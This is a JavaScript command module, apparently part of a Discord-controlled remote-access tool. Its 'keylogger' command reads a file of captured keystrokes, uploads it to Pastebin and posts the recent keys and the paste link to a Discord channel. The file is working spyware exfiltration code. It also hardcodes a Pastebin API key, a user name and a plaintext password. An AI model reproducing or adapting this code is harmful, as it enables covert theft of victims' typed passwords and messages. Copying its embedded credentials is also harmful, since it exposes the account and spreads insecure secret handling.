const Discord = require("discord.js");
const fs = require("fs");
const PastebinAPI = require("pastebin-ts");

module.exports = {
    name: "keylogger",
    description: "Returns all text input made by the user",
    execute(message) {
        const directory = "./log.txt";
        let log = fs.readFileSync(directory);

        const pastebin = new PastebinAPI({
            api_dev_key: "9h2Ym24EzXs4Az-DurefCE2sB1OjgYB5",
            api_user_name: "huysuz",
            api_user_password: "12365400++Kd",
        });

        pastebin
            .createPasteFromFile({
                file: directory,
                title: `${new Date().toLocaleString()} -- log.txt`,
            })
            .then((data) => {
                const logoutput = new Discord.MessageEmbed()
                    .setColor(`RANDOM`)
                    .setTitle(`💻 Keylogger`)
                    .addFields({
                        name: "**Recent 18 keys pressed**",
                        value: `\`\`\`${log.slice(0, 250)}\`\`\``,
                        inline: false,
                    }, { name: "**All logs**", value: `${data}`, inline: true })
                    .setTimestamp();

                message.channel.send({
                    embeds: [logoutput],
                });
            })
            .catch((err) => {
                console.log(err);
            });
    },
};